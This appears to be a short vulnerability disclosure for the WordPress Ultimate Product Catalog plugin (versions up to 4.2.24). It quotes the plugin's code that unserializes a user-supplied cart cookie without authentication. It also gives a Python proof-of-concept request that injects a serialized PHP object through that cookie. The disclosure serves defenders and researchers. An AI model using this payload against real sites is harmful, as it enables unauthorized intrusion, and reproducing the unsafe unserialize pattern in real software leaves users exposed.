# Google Dork: [NA]
# Date: [Okt 30 2017]
# Exploit Author: [tomplixsee]
# Vendor Homepage: [http://www.etoilewebdesign.com/plugins/ultimate-product-catalog/]
# Version: [<= 4.2.24] 
# Tested on: [Ubuntu Server 16.04]
# CVE : [NA]
 
tested on app version 4.2.23, 4.2.24
 
we can send an evil cookie (login not required) to vulnerable function
1. vulnerable code on Functions/Process_Ajax.php <= tested
 
   203 // Adds an item to the plugin&#039;s cart
   204 function UPCP_Add_To_Cart() {
   205 global $woocommerce;
   206 global $wpdb;
   207 global $items_table_name;
   208
   209 $WooCommerce_Checkout = get_option("UPCP_WooCommerce_Checkout");
   210
   211 if ($WooCommerce_Checkout == "Yes") {
   213 echo "WC ID: " . $WC_Prod_ID . "<Br>";
   214 $woocommerce->cart->add_to_cart($WC_Prod_ID);
   215 }
   216
   217 if (isset($_COOKIE[&#039;upcp_cart_products&#039;])) {
   218 $Products_Array = unserialize(str_replace(&#039;\"&#039;, &#039;"&#039;, $_COOKIE[&#039;upcp_cart_products&#039;]));
   219 }
   220 else {
   221 $Products_Array = array();
   222 }
   223
   224 $Products_Array[] = $_POST[&#039;prod_ID&#039;];
   225 $Products_Array = array_unique($Products_Array);
   226 setcookie(&#039;upcp_cart_products&#039;, serialize($Products_Array), time()+3600*24*3, "/");
   227 }
   228 add_action(&#039;wp_ajax_upcp_add_to_cart&#039;, &#039;UPCP_Add_To_Cart&#039;);
   229 add_action( &#039;wp_ajax_nopriv_upcp_add_to_cart&#039;, &#039;UPCP_Add_To_Cart&#039; );
 
2. vulnerable code on Functions/Shortcodes.php <= not tested
   
POC
1. use a WP plugin to test php object injection, 
 
2. make a request 
#-----------------------------------
#! /usr/bin/python
import requests
data = {&#039;action&#039;:&#039;upcp_add_to_cart&#039;}
headers = {
&#039;Content-type&#039;: &#039;application/x-www-form-urlencoded&#039;,
&#039;Accept&#039;: &#039;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8&#039;,
&#039;Cookie&#039;: &#039;upcp_cart_products=O:20:"PHP_Object_Injection":0:{}&#039;
}
r = requests.post(url, data=data, headers=headers)
 
print r.content
 
#------------------------------------

